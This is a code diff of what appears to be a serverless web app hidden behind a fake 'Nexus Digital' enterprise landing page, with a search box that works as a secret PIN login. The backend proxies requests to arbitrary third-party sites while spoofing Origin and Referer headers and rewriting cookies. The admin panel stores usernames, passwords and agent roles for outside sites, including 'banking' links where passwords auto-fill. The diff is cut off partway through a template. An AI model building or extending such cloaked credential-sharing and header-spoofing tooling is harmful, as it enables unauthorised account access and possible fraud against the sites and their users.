@@ -29,13 +29,14 @@ const decrypt = (b64) => {
 // ==========================================
 // 🎨 UI: MASSIVE REALISTIC DECOY LANDING PAGE
 // ==========================================
-const landingPageHTML = `<!DOCTYPE html>
+const landingPageHTML = `
+<!DOCTYPE html>
 <html lang="en" class="dark">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nexus Digital | Enterprise Solutions</title>
-    <script src="https://cdn.tailwindcss.com"><\/script>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
         body { background-color: #050505; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; scroll-behavior: smooth;}
         .loader { border: 2px solid transparent; border-top-color: #000; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; }
@@ -61,17 +62,21 @@ const landingPageHTML = `<!DOCTYPE html>
             <button class="px-5 py-2.5 text-[10px] font-bold uppercase tracking-widest bg-white text-black hover:bg-gray-200 transition">Client Login</button>
         </div>
     </nav>
+
+    <!-- Hero Section -->
     <header class="relative pt-32 pb-20 md:pt-48 md:pb-24 px-4 flex flex-col items-center justify-center border-b border-white/5">
         <div class="absolute top-1/4 left-1/2 -translate-x-1/2 w-3/4 h-1/2 bg-indigo-900/10 blur-[120px] rounded-full pointer-events-none"></div>
         <div class="text-center z-10 w-full max-w-2xl mx-auto">
             <span class="text-[10px] font-bold tracking-widest uppercase text-indigo-400 border border-indigo-500/30 bg-indigo-500/10 px-3 py-1 rounded-full mb-6 inline-block">Enterprise Data Registry V4.2</span>
             <h1 class="text-5xl md:text-7xl font-light tracking-tight mb-4">Secure <span class="font-bold text-white">Assets</span></h1>
             <p class="text-gray-400 text-sm md:text-base tracking-wide mb-10 leading-relaxed">Search our global registry of digital projects, infrastructure documentation, and cloud services.</p>
+            
             <form id="search-form" class="w-full flex items-center p-1.5 border border-white/10 bg-[#0a0a0a] focus-within:border-indigo-500/50 transition-all shadow-[0_0_30px_rgba(0,0,0,0.5)]">
                 <div class="pl-4 flex items-center justify-center pointer-events-none">
                     <svg id="search-icon" class="w-4 h-4 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
                 </div>
-                <input type="text" id="main-search" placeholder="Search by project ID, service or keyword..." autocomplete="off" spellcheck="false" class="w-full bg-transparent text-white text-sm px-4 py-3 placeholder-gray-600 tracking-wide font-medium">
+                <input type="text" id="main-search" placeholder="Search by project ID, service or keyword..." autocomplete="off" spellcheck="false"
+                    class="w-full bg-transparent text-white text-sm px-4 py-3 placeholder-gray-600 tracking-wide font-medium">
                 <button type="submit" id="search-btn" class="px-6 py-3 bg-white hover:bg-gray-200 text-black text-[10px] font-bold uppercase tracking-widest transition flex items-center justify-center min-w-[100px]">
                     <span id="btn-text">Lookup</span><div id="search-spinner" class="loader hidden"></div>
                 </button>
@@ -79,33 +84,7 @@ const landingPageHTML = `<!DOCTYPE html>
             <p id="search-msg" class="text-[10px] font-bold text-gray-500 mt-4 tracking-widest uppercase opacity-0 transition-opacity h-4"></p>
         </div>
     </header>
-    <section class="py-20 px-6 max-w-6xl mx-auto">
-        <h2 class="text-3xl font-bold text-white mb-4 text-center">Enterprise <span class="text-indigo-400">Solutions</span></h2>
-        <p class="text-gray-500 text-center mb-12 text-sm">Comprehensive digital infrastructure management for modern enterprises</p>
-        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-            <div class="feature-box p-8">
-                <div class="w-12 h-12 bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center mb-4">
-                    <svg class="w-6 h-6 text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
-                </div>
-                <h3 class="text-lg font-bold text-white mb-3">Secure Access Control</h3>
-                <p class="text-gray-500 text-sm leading-relaxed">Multi-layer authentication with role-based access management for enterprise security.</p>
-            </div>
-            <div class="feature-box p-8">
-                <div class="w-12 h-12 bg-purple-500/10 border border-purple-500/20 flex items-center justify-center mb-4">
-                    <svg class="w-6 h-6 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4"></path></svg>
-                </div>
-                <h3 class="text-lg font-bold text-white mb-3">Data Registry</h3>
-                <p class="text-gray-500 text-sm leading-relaxed">Centralized project database with real-time synchronization across all edge nodes.</p>
-            </div>
-            <div class="feature-box p-8">
-                <div class="w-12 h-12 bg-green-500/10 border border-green-500/20 flex items-center justify-center mb-4">
-                    <svg class="w-6 h-6 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
-                </div>
-                <h3 class="text-lg font-bold text-white mb-3">Edge Computing</h3>
-                <p class="text-gray-500 text-sm leading-relaxed">Low-latency processing with 200+ global edge nodes for instant data delivery.</p>
-            </div>
-        </div>
-    </section>
+
     <div class="w-full border-b border-white/5 bg-[#080808]">
         <div class="max-w-5xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-4 py-12 px-6 text-center">
             <div><p class="text-3xl font-bold text-white mb-1">99.99%</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">Uptime SLA</p></div>
@@ -114,11 +93,14 @@ const landingPageHTML = `<!DOCTYPE html>
             <div><p class="text-3xl font-bold text-white mb-1">AES-GCM</p><p class="text-[9px] text-gray-500 uppercase tracking-widest">256-bit Encrypted</p></div>
         </div>
     </div>
+
+    <!-- Massive Footer -->
     <footer class="pt-20 pb-10 px-6 bg-[#030303] border-t border-white/5">
         <div class="max-w-7xl mx-auto flex flex-col items-center">
             <p class="text-[10px] text-gray-600 uppercase tracking-widest">&copy; 2026 Nexus Digital Enterprise. All rights reserved.</p>
         </div>
     </footer>
+
     <script>
         document.getElementById('search-form').addEventListener('submit', async (e) => {
             e.preventDefault();
@@ -131,7 +113,7 @@ const landingPageHTML = `<!DOCTYPE html>
                 const res = await fetch('/api/access', { method: 'POST', body: JSON.stringify({ code: q }) });
                 if (res.ok) {
                     const data = await res.json();
-                    document.getElementById('search-msg').style.color = '#4ade80';
+                    document.getElementById('search-msg').style.color = '#4ade80'; 
                     document.getElementById('search-msg').innerText = 'NODE IDENTIFIED. CONNECTING...';
                     document.getElementById('search-msg').style.opacity = '1';
                     setTimeout(() => window.location.href = data.role === 'admin' ? '/admin' : '/dashboard', 800);
@@ -141,7 +123,7 @@ const landingPageHTML = `<!DOCTYPE html>
                         document.getElementById('search-spinner').classList.add('hidden');
                         document.getElementById('main-search').disabled = false;
                         document.getElementById('main-search').value = '';
-                        document.getElementById('search-msg').style.color = '#ef4444';
+                        document.getElementById('search-msg').style.color = '#ef4444'; 
                         document.getElementById('search-msg').innerText = 'NO RESULTS FOUND FOR "' + q.toUpperCase() + '"';
                         document.getElementById('search-msg').style.opacity = '1';
                     }, 1000);
@@ -150,7 +132,8 @@ const landingPageHTML = `<!DOCTYPE html>
         });
     </script>
 </body>
-</html>`;
+</html>
+`;
 
 // ==========================================
 // 🚀 BACKEND & CORE LOGIC
@@ -204,6 +187,7 @@ export default {
         // --- 📡 UNIVERSAL API INTERCEPTOR PROXY ---
         if (path === "/__api_proxy") {
             let reqOrigin = request.headers.get("Origin") || url.origin;
+
             if (request.method === "OPTIONS") {
                 return new Response(null, {
                     status: 204,
@@ -216,10 +200,13 @@ export default {
                     }
                 });
             }
+
             const targetUrlStr = url.searchParams.get("target");
             if(!targetUrlStr) return new Response("Bad Target", {status:400});
+            
             const tObj = new URL(targetUrlStr);
             const proxyHeaders = new Headers(request.headers);
+            
             let originSpoof = tObj.origin;
             let refererSpoof = tObj.origin + "/";
             if (isProxyActive) {
@@ -235,17 +222,22 @@ export default {
                     } catch(e) {}
                 }
             }
+
             proxyHeaders.set("Host", tObj.hostname);
             proxyHeaders.set("Origin", originSpoof);
             proxyHeaders.set("Referer", refererSpoof);
             proxyHeaders.delete("Accept-Encoding");
+            
             const cleanCookieStr = Object.entries(cookies).filter(([k]) => k !== 'portal_session' && k !== 'proxy_active' && k !== 'admin_session').map(([k,v]) => `${k}=${v}`).join('; ');
             if (cleanCookieStr) proxyHeaders.set("Cookie", cleanCookieStr); else proxyHeaders.delete("Cookie");
+
             const fetchConfig = { method: request.method, headers: proxyHeaders, redirect: "manual" };
             if (["POST", "PUT", "PATCH", "DELETE"].includes(request.method)) fetchConfig.body = request.body;
+
             try {
                 const proxyRes = await fetch(targetUrlStr, fetchConfig);
                 const responseHeaders = new Headers();
+                
                 for (const[key, value] of proxyRes.headers.entries()) {
                     if (key.toLowerCase() === 'set-cookie') {
                         let modCookie = value.replace(/Domain=[^;]+;?\s*/gi, '');
@@ -254,9 +246,11 @@ export default {
                         responseHeaders.append(key, value);
                     }
                 }
+                
                 responseHeaders.set("Access-Control-Allow-Origin", reqOrigin);
                 responseHeaders.set("Access-Control-Allow-Credentials", "true");
-                responseHeaders.set("Access-Control-Expose-Headers", "Content-Length, Content-Type, Date, Server, Transfer-Encoding, Authorization, sid, Token");
+                responseHeaders.set("Access-Control-Expose-Headers", "Content-Length, Content-Type, Date, Server, Transfer-Encoding, Authorization, sid, Token"); 
+
                 return new Response(proxyRes.body, { status: proxyRes.status, statusText: proxyRes.statusText, headers: responseHeaders });
             } catch(e) {
                 return new Response("API Proxy Error", { status: 500 });
@@ -294,38 +288,11 @@ export default {
             return new Response(JSON.stringify({ success: true }));
         }
 
-        if (path === "/api/add-account" && request.method === "POST") {
-            if (!isUser) return new Response("Denied", { status: 403 });
-            const { siteId, username, password, role } = await request.json();
-            if (!db.pins[userPin].siteConf) db.pins[userPin].siteConf = {};
-            if (!db.pins[userPin].siteConf[siteId]) db.pins[userPin].siteConf[siteId] = {u:'', r:'Admin', p:''};
-            if (!db.pins[userPin].siteConf[siteId].additionalAccounts) {
-                db.pins[userPin].siteConf[siteId].additionalAccounts = [];
-            }
-            db.pins[userPin].siteConf[siteId].additionalAccounts.push({
-                username: username,
-                password: password,
-                role: role || 'Admin'
-            });
-            await updateDB(db);
-            return new Response(JSON.stringify({ success: true }));
-        }
-
-        if (path === "/api/delete-account" && request.method === "POST") {
-            if (!isUser) return new Response("Denied", { status: 403 });
-            const { siteId, accountIndex } = await request.json();
-            if (db.pins[userPin].siteConf && db.pins[userPin].siteConf[siteId] && db.pins[userPin].siteConf[siteId].additionalAccounts) {
-                db.pins[userPin].siteConf[siteId].additionalAccounts.splice(accountIndex, 1);
-                await updateDB(db);
-            }
-            return new Response(JSON.stringify({ success: true }));
-        }
-
         if (path === "/logout" || path === "/api/stop-proxy") {
             return new Response("Logged out", { status: 302, headers: { "Location": "/", "Set-Cookie": "proxy_active=; Max-Age=0; Path=/" } });
         }
 
-        // --- 🛠️ COMMON MODAL TEMPLATE ---
+        // --- 🛠️ COMMON MODAL TEMPLATE (SQUARE) ---
         const customModalScript = `
         <div id="c-modal" class="hidden fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-md">
             <div class="bg-[#0a0a0a] border border-white/10 p-6 max-w-sm w-full mx-4 shadow-2xl flex flex-col">
@@ -367,18 +334,16 @@ export default {
             }
 
             const adminHTML = `<!DOCTYPE html><html lang="en" class="dark">
-            <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Portal</title><script src="https://cdn.tailwindcss.com"><\/script>
+            <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Admin Portal</title><script src="https://cdn.tailwindcss.com"></script>
             <style>
-                body { background-color: #030303; color: white; font-family: 'Inter', sans-serif; }
-                .square-card { background: #0a0a0a; border: 1px solid rgba(255,255,255,0.05); }
+                body { background-color: #030303; color: white; font-family: 'Inter', sans-serif; } 
+                .square-card { background: #0a0a0a; border: 1px solid rgba(255,255,255,0.05); } 
                 .active-tab { border-b-2 border-indigo-400; color: white; }
                 .square-checkbox { appearance: none; width: 14px; height: 14px; border: 1px solid rgba(255,255,255,0.3); background: rgba(0,0,0,0.5); cursor: pointer; position: relative; transition: all 0.2s; }
                 .square-checkbox:checked { background: #6366f1; border-color: #6366f1; }
                 .square-checkbox:checked::after { content: '✓'; position: absolute; color: white; font-size: 10px; font-weight: bold; left: 2px; top: -1px; }
                 .square-select { appearance: none; border-radius: 0; background: #000; border: 1px solid rgba(255,255,255,0.2); outline: none; cursor: pointer; }
                 .square-select:focus { border-color: #6366f1; }
-                .custom-scrollbar::-webkit-scrollbar { width: 4px; }
-                .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); }
             </style>
             </head>
             <body class="pb-28">
@@ -395,12 +360,14 @@ export default {
                 </div>
                 <script>
                     let db = {}; let tab = 'pins'; let openPins = new Set(); let searchQuery = '';
+
                     async function load(){ const res = await fetch('/admin/api/data'); db = await res.json(); render(); }
-                    async function save(){
+                    async function save(){ 
                         document.getElementById('save-btn').innerText = 'SAVING...';
-                        await fetch('/admin/api/save', {method:'POST', body:JSON.stringify(db)});
+                        await fetch('/admin/api/save', {method:'POST', body:JSON.stringify(db)}); 
                         setTimeout(() => { document.getElementById('save-btn').innerText = 'SAVE ALL CHANGES'; CustomModal.show({type:'alert', title:'<span class="text-green-500">✔</span> Success', text:'Database Successfully Updated!'}); }, 500);
                     }
+
                     function uPinSt(pin, val) { db.pins[pin].status = val; render(); }
                     function uPinF(pin, field, val) { db.pins[pin][field] = val; }
                     function uSiteF(id, f, val) { db.sites[id][f] = val; }
@@ -426,67 +393,37 @@ export default {
                         if(!db.pins[pin].siteConf[siteId]) db.pins[pin].siteConf[siteId] = {u:'', r:'Admin', p:''};
                         db.pins[pin].siteConf[siteId][field] = val;
                     }
-
-                    let addAccSiteId = null, addAccPin = null;
-
-                    function openAddAccountForm(pin, siteId) {
-                        addAccPin = pin;
-                        addAccSiteId = siteId;
-                        document.getElementById('add-account-form').classList.remove('hidden');
-                        document.getElementById('acc-username').value = '';
-                        document.getElementById('acc-password').value = '';
-                        document.getElementById('acc-role').value = 'Admin';
-                    }
-
-                    function confirmAddAccount() {
-                        const username = document.getElementById('acc-username').value.trim();
-                        const password = document.getElementById('acc-password').value.trim();
-                        const role = document.getElementById('acc-role').value;
-                        if(!username || !password) return CustomModal.show({type:'alert', title:'<span class="text-red-500">⚠</span> Error', text:'Please fill all fields!'});
-                        if(!db.pins[addAccPin].siteConf[addAccSiteId].additionalAccounts) {
-                            db.pins[addAccPin].siteConf[addAccSiteId].additionalAccounts = [];
-                        }
-                        db.pins[addAccPin].siteConf[addAccSiteId].additionalAccounts.push({ username, password, role });
-                        document.getElementById('add-account-form').classList.add('hidden');
-                        render();
-                    }
-
-                    function cancelAddAccount() {
-                        document.getElementById('add-account-form').classList.add('hidden');
-                    }
-
-                    function removeAdditionalAccount(pin, siteId, index) {
-                        CustomModal.show({type:'confirm', title:'<span class="text-red-500">⚠</span> Remove Account', text:'Are you sure?', onConfirm: (yes) => {
-                            if(yes && db.pins[pin].siteConf[siteId].additionalAccounts) {
-                                db.pins[pin].siteConf[siteId].additionalAccounts.splice(index, 1);
-                                render();
-                            }
-                        }});
-                    }
-
+                    
                     function toggleNotifUser(pin, chk) {
                         let list = db.settings.notification.specificUsers ||[];
                         if(chk && !list.includes(pin)) list.push(pin);
                         else if(!chk) list = list.filter(i => i !== pin);
                         db.settings.notification.specificUsers = list;
                     }
+
                     function addSite() { db.sites['s_'+Date.now()] = {name:'', agentLink:'', userLink:'', apiLink:'', bankingLink:''}; tab='sites'; render(); }
-                    function addPin() {
-                        CustomModal.show({type:'prompt', title:'New User', text:'Enter User Name:', onConfirm: (name) => {
+                    
+                    function addPin() { 
+                        CustomModal.show({type:'prompt', title:'New User', text:'Enter User Name (e.g. John Doe):', onConfirm: (name) => {
                             if(!name) return;
-                            CustomModal.show({type:'prompt', title:'Set PIN', text:'Enter Secret PIN:', onConfirm: (p) => {
-                                if(p && !db.pins[p]){
-                                    db.pins[p] = { name: name, status:'active', sites:[], siteConf:{} };
-                                    openPins.add(p); tab='pins'; render();
+                            CustomModal.show({type:'prompt', title:'Set PIN', text:'Enter Secret PIN for this User:', onConfirm: (p) => {
+                                if(p && !db.pins[p]){ 
+                                    db.pins[p] = { name: name, status:'active', sites:[], siteConf:{} }; 
+                                    openPins.add(p); tab='pins'; render(); 
                                 } else if(db.pins[p]) {
-                                    CustomModal.show({type:'alert', title:'<span class="text-red-500">✖</span> Error', text:'PIN exists!'});
+                                    CustomModal.show({type:'alert', title:'<span class="text-red-500">✖</span> Error', text:'This PIN already exists!'});
                                 }
                             }});
                         }});
                     }
-                    function delSite(id) { CustomModal.show({type:'confirm', title:'<span class="text-red-500">⚠</span> Delete Site', text:'Delete this site?', onConfirm: (yes) => { if(yes) { delete db.sites[id]; render(); } }}); }
-                    function delPin(pin) { CustomModal.show({type:'confirm', title:'<span class="text-red-500">⚠</span> Delete User', text:'Delete user?', onConfirm: (yes) => { if(yes) { delete db.pins[pin]; render(); } }}); }
-                    function toggleAdminPin(pin) { if(openPins.has(pin)) openPins.delete(pin); else openPins.add(pin); render(); }
+
+                    function delSite(id) { CustomModal.show({type:'confirm', title:'<span class="text-red-500">⚠</span> Delete Site', text:'Are you sure you want to delete this site?', onConfirm: (yes) => { if(yes) { delete db.sites[id]; render(); } }}); }
+                    function delPin(pin) { CustomModal.show({type:'confirm', title:'<span class="text-red-500">⚠</span> Delete User', text:'Are you sure you want to delete this user PIN?', onConfirm: (yes) => { if(yes) { delete db.pins[pin]; render(); } }}); }
+
+                    function toggleAdminPin(pin) {
+                        if(openPins.has(pin)) openPins.delete(pin); else openPins.add(pin);
+                        render();
+                    }
 
                     function render() {
                         if(!db.sites) db.sites = {}; if(!db.pins) db.pins = {}; if(!db.settings) db.settings = {whatsapp:'', notification:{enabled:false, target:'all', specificUsers:[]}};
@@ -531,7 +468,6 @@ export default {
                                         Object.keys(db.sites).forEach(siteId => {
                                             let hasSite = (pData.sites||[]).includes(siteId);
                                             let conf = pData.siteConf?.[siteId] || {u:'', r:'Admin', p:''};
-                                            let additionalAccounts = conf.additionalAccounts || [];
                                             html += \`<div class="bg-[#0a0a0a] border border-white/10 p-3">
                                                 <label class="flex items-center gap-3 text-xs cursor-pointer">
                                                     <input type="checkbox" \${hasSite ? 'checked':''} onchange="toggleSite('\${pin}', '\${siteId}', this.checked)" class="square-checkbox w-4 h-4">
@@ -546,21 +482,7 @@ export default {
                                                         <option value="Super Agent" \${conf.r==='Super Agent'?'selected':''}>Super Agent</option>
                                                         <option value="Master Agent" \${conf.r==='Master Agent'?'selected':''}>Master Agent</option>
                                                     </select>
-                                                    <div class="border-t border-white/10 pt-3 mt-3">
-                                                        <div class="flex justify-between items-center mb-2">
-                                                            <span class="text-[8px] font-bold text-gray-500 uppercase tracking-widest">Additional Accounts:</span>
-                                                            <button onclick="openAddAccountForm('\${pin}','\${siteId}')" class="text-[9px] font-bold text-indigo-400 hover:text-indigo-300 uppercase tracking-widest bg-indigo-500/10 border border-indigo-500/30 px-2 py-1 transition">+ Add Another Account</button>
-                                                        </div>\`;
-                                                    additionalAccounts.forEach((acc, idx) => {
-                                                        html += \`<div class="bg-black/50 border border-white/5 p-2 mb-2 flex justify-between items-center">
-                                                            <div class="flex flex-col">
-                                                                <span class="text-[10px] text-white font-bold truncate">\${acc.username}</span>
-                                                                <span class="text-[8px] \${acc.role==='Admin'?'text-purple-400':acc.role==='Super Agent'?'text-blue-400':'text-yellow-400'}">\${acc.role || 'Admin'}</span>
-                                                            </div>
-                                                            <button onclick="removeAdditionalAccount('\${pin}','\${siteId}',\${idx})" class="text-red-500 hover:text-red-400 text-[8px] font-bold uppercase tracking-widest">Remove</button>
-                                                        </div>\`;
-                                                    });
-                                                    html += \`</div></div>\`;
+                                                </div>\`;
                                             }
                                             html += \`</div>\`;
                                         });
@@ -579,13 +501,26 @@ export default {
                                 html += \`<div class="square-card p-5 flex flex-col">
                                     <div class="mb-4">
                                         <span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Site Name</span>
-                                        <input value="\${db.sites[id].name}" oninput="uSiteF('\${id}','name',this.value)" placeholder="Website Name..." class="w-full bg-transparent text-xl font-bold text-white border-b border-white/10 outline-none pb-1 focus:border-indigo-500">
+                                        <input value="\${db.sites[id].name}" oninput="uSiteF('\${id}','name',this.value)" placeholder="Enter Website Name..." class="w-full bg-transparent text-xl font-bold text-white border-b border-white/10 outline-none pb-1 focus:border-indigo-500">
                                     </div>
                                     <div class="space-y-3 mb-5 flex-grow">
-                                        <div><span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Agent Link</span><input value="\${db.sites[id].agentLink}" oninput="uSiteF('\${id}','agentLink',this.value)" placeholder="https://..." class="w-full bg-black/50 border border-white/10 p-2 text-xs text-green-400 outline-none focus:border-white/30"></div>
-                                        <div><span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">User Link</span><input value="\${db.sites[id].userLink}" oninput="uSiteF('\${id}','userLink',this.value)" placeholder="ag.example.com" class="w-full bg-black/50 border border-white/10 p-2 text-xs text-blue-400 outline-none focus:border-white/30"></div>
-                                        <div><span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Backend API Link</span><input value="\${db.sites[id].apiLink||''}" oninput="uSiteF('\${id}','apiLink',this.value)" placeholder="e.g. https://liveapi247.live" class="w-full bg-black/50 border border-white/10 p-2 text-xs text-purple-400 outline-none focus:border-white/30"></div>
-                                        <div class="mt-4 pt-3 border-t border-white/5"><span class="text-[8px] text-yellow-500 font-bold uppercase tracking-widest mb-1 block">Banking Link</span><input value="\${db.sites[id].bankingLink||''}" oninput="uSiteF('\${id}','bankingLink',this.value)" placeholder="/agent/banking" class="w-full bg-yellow-500/10 border border-yellow-500/30 p-2 text-xs text-yellow-400 outline-none focus:border-yellow-500"></div>
+                                        <div><span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Agent Link</span>
+                                        <input value="\${db.sites[id].agentLink}" oninput="uSiteF('\${id}','agentLink',this.value)" placeholder="https://..." class="w-full bg-black/50 border border-white/10 p-2 text-xs text-green-400 outline-none focus:border-white/30"></div>
+                                        
+                                        <div><span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">User Link</span>
+                                        <input value="\${db.sites[id].userLink}" oninput="uSiteF('\${id}','userLink',this.value)" placeholder="ag.example.com" class="w-full bg-black/50 border border-white/10 p-2 text-xs text-blue-400 outline-none focus:border-white/30"></div>
+                                        
+                                        <div>
+                                            <span class="text-[8px] text-gray-500 uppercase tracking-widest mb-1 block">Backend API Link (For Login/Live Balance)</span>
+                                            <input value="\${db.sites[id].apiLink||''}" oninput="uSiteF('\${id}','apiLink',this.value)" placeholder="e.g. https://liveapi247.live" class="w-full bg-black/50 border border-white/10 p-2 text-xs text-purple-400 outline-none focus:border-white/30">
+                                            <p class="text-[8px] text-gray-600 mt-1 italic">If the site loads balance from another domain, put it here.</p>
+                                        </div>
+
+                                        <div class="mt-4 pt-3 border-t border-white/5">
+                                            <span class="text-[8px] text-yellow-500 font-bold uppercase tracking-widest mb-1 block">Banking / Add Balance Link (For Auto-fill)</span>
+                                            <input value="\${db.sites[id].bankingLink||''}" oninput="uSiteF('\${id}','bankingLink',this.value)" placeholder="e.g. /agent/banking or full URL" class="w-full bg-yellow-500/10 border border-yellow-500/30 p-2 text-xs text-yellow-400 outline-none focus:border-yellow-500">
+                                            <p class="text-[8px] text-gray-500 mt-1 italic">When user goes to this link, password will auto-fill again.</p>
+                                        </div>
                                     </div>
                                     <button onclick="delSite('\${id}')" class="w-full py-2.5 bg-red-900/20 text-red-500 text-[10px] font-bold uppercase tracking-[0.2em] hover:bg-red-900/50 transition border border-red-900/30">Delete Site</button>
                                 </div>\`;
@@ -596,49 +531,59 @@ export default {
                         if(tab === 'settings') {
                             let n = db.settings.notification;
                             html += \`<div class="grid grid-cols-1 md:grid-cols-2 gap-5">
-                                <div class="square-card p-6"><h2 class="text-sm font-bold tracking-widest uppercase mb-6 text-green-500">WhatsApp Float</h2><label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Phone</label><input value="\${db.settings.whatsapp||''}" oninput="uSet('whatsapp',this.value)" placeholder="+8801..." class="w-full bg-black/50 border border-white/10 p-3 text-sm outline-none focus:border-green-500 text-green-400"></div>
-                                <div class="square-card p-6"><div class="flex justify-between items-center mb-6"><h2 class="text-sm font-bold tracking-widest uppercase text-indigo-400">Notice</h2><label class="flex items-center gap-2 text-[10px] font-bold uppercase cursor-pointer text-indigo-400 bg-indigo-900/20 px-3 py-1 border border-indigo-500/30 rounded-sm"><input type="checkbox" \${n.enabled?'checked':''} onchange="uNotif('enabled',this.checked)" class="square-checkbox border-indigo-500"> Enable</label></div>
-                                <div class="mb-4 border-b border-white/10 pb-4"><label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Target</label><select onchange="uNotif('target', this.value); render()" class="square-select w-full p-2 text-xs text-white"><option value="all" \${n.target==='all'?'selected':''}>All Users</option><option value="specific" \${n.target==='specific'?'selected':''}>Specific</option></select>\`;
-                                if(n.target === 'specific') { html += \`<div class="mt-3 space-y-1 max-h-32 overflow-y-auto pr-2 custom-scrollbar">\`; Object.keys(db.pins).forEach(p => { let chk = (n.specificUsers||[]).includes(p) ? 'checked' : ''; html += \`<label class="flex items-center gap-2 text-xs bg-white/5 border border-white/5 p-2 cursor-pointer hover:bg-white/10"><input type="checkbox" \${chk} onchange="toggleNotifUser('\${p}', this.checked)" class="square-checkbox"><span class="truncate text-gray-300">\${db.pins[p].name || 'Unnamed'} <span class="text-indigo-400">(\${p})</span></span></label>\`; }); html += \`</div>\`; }
-                                html += \`</div><label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Message</label><textarea oninput="uNotif('text',this.value)" placeholder="Notice..." class="w-full bg-black/50 border border-white/10 p-3 text-xs mb-3 outline-none min-h-[80px] focus:border-indigo-500 custom-scrollbar">\${n.text||''}</textarea>
-                                <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Image URL</label><input value="\${n.image||''}" oninput="uNotif('image',this.value)" placeholder="https://..." class="w-full bg-black/50 border border-white/10 p-3 text-xs mb-3 outline-none focus:border-indigo-500">
-                                <div class="flex gap-3"><div class="w-1/2"><label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Btn Text</label><input value="\${n.btnText||''}" oninput="uNotif('btnText',this.value)" placeholder="JOIN" class="w-full bg-black/50 border border-white/10 p-3 text-xs outline-none focus:border-indigo-500"></div><div class="w-1/2"><label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Btn Link</label><input value="\${n.btnLink||''}" oninput="uNotif('btnLink',this.value)" placeholder="https://..." class="w-full bg-black/50 border border-white/10 p-3 text-xs outline-none focus:border-indigo-500"></div></div></div></div>\`;
+                                <div class="square-card p-6">
+                                    <h2 class="text-sm font-bold tracking-widest uppercase mb-6 text-green-500">WhatsApp Float</h2>
+                                    <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Phone Number</label>
+                                    <input value="\${db.settings.whatsapp||''}" oninput="uSet('whatsapp',this.value)" placeholder="+8801..." class="w-full bg-black/50 border border-white/10 p-3 text-sm outline-none focus:border-green-500 text-green-400">
+                                </div>
+                                <div class="square-card p-6">
+                                    <div class="flex justify-between items-center mb-6">
+                                        <h2 class="text-sm font-bold tracking-widest uppercase text-indigo-400">Notice Popup</h2>
+                                        <label class="flex items-center gap-2 text-[10px] font-bold uppercase cursor-pointer text-indigo-400 bg-indigo-900/20 px-3 py-1 border border-indigo-500/30 rounded-sm">
+                                            <input type="checkbox" \${n.enabled?'checked':''} onchange="uNotif('enabled',this.checked)" class="square-checkbox border-indigo-500"> Enable
+                                        </label>
+                                    </div>
+                                    <div class="mb-4 border-b border-white/10 pb-4">
+                                        <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Target Audience</label>
+                                        <select onchange="uNotif('target', this.value); render()" class="square-select w-full p-2 text-xs text-white">
+                                            <option value="all" \${n.target==='all'?'selected':''}>Broadcast to ALL Users</option>
+                                            <option value="specific" \${n.target==='specific'?'selected':''}>Send to SPECIFIC Users</option>
+                                        </select>
+                                        \`;
+                                        if(n.target === 'specific') {
+                                            html += \`<div class="mt-3 space-y-1 max-h-32 overflow-y-auto pr-2 custom-scrollbar">\`;
+                                            Object.keys(db.pins).forEach(p => {
+                                                let chk = (n.specificUsers||[]).includes(p) ? 'checked' : '';
+                                                html += \`<label class="flex items-center gap-2 text-xs bg-white/5 border border-white/5 p-2 cursor-pointer hover:bg-white/10">
+                                                    <input type="checkbox" \${chk} onchange="toggleNotifUser('\${p}', this.checked)" class="square-checkbox">
+                                                    <span class="truncate text-gray-300">\${db.pins[p].name || 'Unnamed'} <span class="text-indigo-400">(\${p})</span></span>
+                                                </label>\`;
+                                            });
+                                            html += \`</div>\`;
+                                        }
+                                        html += \`
+                                    </div>
+                                    <label class="text-[9px] uppercase tracking-widest text-gray-500 mb-1 block">Message</label>
